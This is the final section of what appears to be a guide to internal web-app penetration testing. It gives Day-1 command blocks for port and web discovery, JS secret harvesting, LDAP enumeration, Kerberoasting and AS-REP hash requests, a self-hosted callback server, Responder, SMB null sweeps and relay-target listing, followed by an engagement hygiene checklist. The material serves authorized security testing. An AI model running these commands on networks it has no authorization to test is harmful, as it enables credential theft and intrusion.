## Part 9 — Top 10 actionable commands for Day 1

One-time setup:
```bash
export ENG=~/engagements/$(date +%F)-internal-webapp
mkdir -p $ENG/{recon,web,creds,loot,evidence} && cd $ENG
export TARGET_CIDR=10.10.20.0/24
export DC_IP=10.10.10.10
export DOMAIN=corp.local
export ATTACKER_IP=10.10.99.5
export RESOLVER=$DC_IP
```

**1. Mass host/port discovery:**
```bash
sudo masscan $TARGET_CIDR -p0-65535 --rate 5000 -oG recon/masscan.gnmap
awk '/Host:/ {print $2}' recon/masscan.gnmap | sort -u > recon/live.hosts
sudo nmap -sS -sV -sC --version-intensity 5 -Pn -T4 -iL recon/live.hosts \
  -p 21,22,25,53,80,88,110,135,139,143,389,443,445,464,500,514,587,593,636,993,995,1433,1521,2049,3268,3269,3306,3389,5000,5432,5601,5900,5985,5986,6379,7001,7002,8000,8008,8009,8080,8081,8088,8089,8090,8161,8443,8500,8834,8888,9000,9001,9090,9091,9092,9100,9200,9300,9418,9443,10000,11211,15672,27017,50070 \
  -oA recon/nmap-full
```

**2. Fast web service probe:**
```bash
httpx -l recon/live.hosts -silent -status-code -title -tech-detect -tls-grab \
      -favicon -web-server -follow-redirects \
      -ports 80,443,8080,8443,8000,8888,9000,9090,3000,5000,5601,7001,8081,8180,9443 \
      -H 'User-Agent: Mozilla/5.0 AppSec' \
      -threads 100 -timeout 8 -duc -o web/httpx.out -json -o web/httpx.json
awk '{print $1}' web/httpx.out | sort -u > web/urls.live
```

**3. Screenshot sweep:**
```bash
gowitness scan file -f web/urls.live --screenshot-path web/shots \
  --timeout 20 --resolution-x 1440 --resolution-y 900 --write-db \
  --chrome-path /usr/bin/chromium
gowitness report serve --address 127.0.0.1:7171 &
```

**4. Internal DNS brute:**
```bash
echo $RESOLVER > recon/resolvers.txt
puredns bruteforce /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  $DOMAIN -r recon/resolvers.txt --resolvers-trusted recon/resolvers.txt \
  --skip-validation --rate-limit 500 --write recon/subs.$DOMAIN.txt
```

**5. Nuclei baseline with self-hosted OAST:**
```bash
nuclei -l web/urls.live -ud /opt/tools/nuclei-templates -disable-update-check \
  -severity low,medium,high,critical \
  -tags cve,exposure,config,default-login,takeover,tech,misconfiguration \
  -exclude-tags dos,fuzz,intrusive \
  -iserver https://oast.corp.internal -itoken $INTERACT_TOKEN \
  -rate-limit 50 -concurrency 25 -retries 1 \
  -o web/nuclei.out -j -je web/nuclei.json
```

**6. Content discovery on a target app:**
```bash
TARGET_APP=app.corp.local
ffuf -u "https://$TARGET_APP/FUZZ" \
  -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,204,301,302,307,401,403,405 -fc 404 -ac -recursion -recursion-depth 2 \
  -t 40 -timeout 10 -k -of json -o web/ffuf.$TARGET_APP.json
```

**7. JS harvest + jsluice:**
```bash
katana -u https://$TARGET_APP -d 3 -jc -silent -duc | grep -Ei '\.js(\?|$)' | sort -u > web/js.urls
mkdir -p web/js && wget -q --no-check-certificate -i web/js.urls -P web/js/ -nc
find web/js -type f -name '*.js' -exec jsluice urls    {} \; | sort -u > web/js.endpoints
find web/js -type f -name '*.js' -exec jsluice secrets {} \; | tee web/js.secrets
trufflehog filesystem --directory web/js --no-verification -j > web/js.trufflehog.json
```

**8. LDAP dump for HTTP SPNs (find every internal web app via AD):**
```bash
nxc ldap $DC_IP -u "$LDAPUSER" -p "$LDAPPASS" -d $DOMAIN --users --groups --computers > creds/ldap.dump
ldapsearch -x -LLL -H ldap://$DC_IP \
  -D "$LDAPUSER@$DOMAIN" -w "$LDAPPASS" \
  -b "$(echo dc=$DOMAIN | sed 's/\./,dc=/g')" \
  '(servicePrincipalName=HTTP/*)' servicePrincipalName sAMAccountName dNSHostName \
  > creds/http-spns.ldif
impacket-GetUserSPNs $DOMAIN/$LDAPUSER:"$LDAPPASS" -dc-ip $DC_IP -request -outputfile creds/roast.hashes
impacket-GetNPUsers $DOMAIN/$LDAPUSER:"$LDAPPASS" -dc-ip $DC_IP -request -outputfile creds/asrep.hashes
```

**9. Start self-hosted interactsh-server:**
```bash
sudo systemctl stop systemd-resolved
sudo interactsh-server -domain oast.corp.local \
  -ip $ATTACKER_IP -listen-ip 0.0.0.0 \
  -http-port 80 -https-port 443 -ldap -smb \
  -token $(openssl rand -hex 32) \
  -skip-acme -disable-update-check 2>&1 | tee evidence/interactsh.log &
export INTERACT_TOKEN=<token from above>
interactsh-client -server https://oast.corp.local -token $INTERACT_TOKEN -v
```

**10. Responder analyze + NetExec null SMB sweep:**
```bash
sudo responder -I eth0 -A 2>&1 | tee evidence/responder-analyze.log &
nxc smb $TARGET_CIDR -u '' -p '' --shares 2>&1 | tee recon/nxc.null.smb
nxc smb $TARGET_CIDR -u 'guest' -p '' --shares 2>&1 | tee recon/nxc.guest.smb
nxc smb $DC_IP -u '' -p '' --rid-brute 10000 2>&1 | tee recon/nxc.rid.dc
nxc smb $TARGET_CIDR --gen-relay-list recon/smb-no-signing.txt
```

---

## Cross-cutting hygiene checklist

- Corp root CA installed system-wide + exported `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `CURL_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS`.
- `NO_PROXY` set for RFC1918 and client TLDs **before** any proxy env var — otherwise internal scans route through corp egress proxy, get logged, and generate SOC alerts.
- `-disable-update-check` / `--disable-update` / `--no-update` on every PD/Python tool — silent internet attempts burn minutes and leak intent.
- `--skip-validation` (puredns) mandatory — default validation hits 8.8.8.8.
- `nxc smb $DC --pass-pol` **before** any spray to avoid account lockouts. One password × many users; never reverse.
- Lockout observation window typically 30 min; stay `attempts-1` per user per window.
- Verify EPA + LDAP channel binding before planning relay — `nxc ldap -M ldap-checker`, `nxc smb --gen-relay-list`.
- Self-hosted interactsh is **non-negotiable**; jwt_tool's `jwksloc` and Dalfox's `-b` must point at it, not public OAST.
- Rate-limit nuclei/commix/sqlmap conservatively — legacy intranet gear crashes under default aggression. Never run `dos` or `fuzz` tagged templates without written approval.
- Exclude printer and OT VLANs from all scans.
- Evidence discipline: `F001-step1-<desc>.png`; capture URL bar + timestamp; pcap per auth finding; asciinema for multi-step exploits; blur sensitive tokens.
- Keep a shared OAST log with timestamps, source IPs, and payload IDs — every callback is evidence.
- **SPN = target list.** If you have any domain creds at all, the `(servicePrincipalName=HTTP/*)` LDAP query is the single highest-value step of the whole engagement for internal web app discovery.

## Conclusion

The defining shift from public bug-bounty methodology to internal web app pentesting is a **complete inversion of the recon model**: you lose every passive intel source (CT logs, Wayback, Shodan, Chaos, GitHub dorks, AlienVault, VirusTotal, public Collaborator) and gain two substantially more powerful active primitives — **Active Directory as an oracle** (every `HTTP/*` SPN in LDAP is literally a registered internal web app) and **on-network OAST** (self-hosted interactsh catches blind vulns that external Collaborator would for public apps). The toolbox pivot reflects this: Impacket/ntlmrelayx/Kerbrute/NetExec move from nice-to-have to first-class web pentest tools because internal web apps live inside AD auth; `puredns` against internal resolvers replaces `subfinder`; katana + jsluice + xnLinkFinder replace gau + waybackurls + ParamSpider; custom Nuclei templates catch the internal-specific exposures (`/actuator/*`, `/.git/`, `/swagger`, ViewState, JBoss legacy) that public templates under-cover. Air-gap prep is the single most leveraged investment — a day spent staging Nuclei templates, wordlists, Python wheels, Go binaries, corp CA trust, and self-hosted interactsh before going on site converts a hostile offline environment into the testing platform you actually want. Once that's done, the methodology flows: L2/DNS/port → httpx + screenshots → vhost + content + JS + param discovery → nuclei + tech-specific scanners → manual exploitation through Burp (with NTLM/Kerberos configured) → NTLM relay and AD-aware auth attacks → internal git/share secret hunting → reporting with local-first note tools. The Day-1 quick-start commands in Part 9 execute that flow in its minimum-viable form; the tool-by-tool sections deepen each phase as the engagement demands.
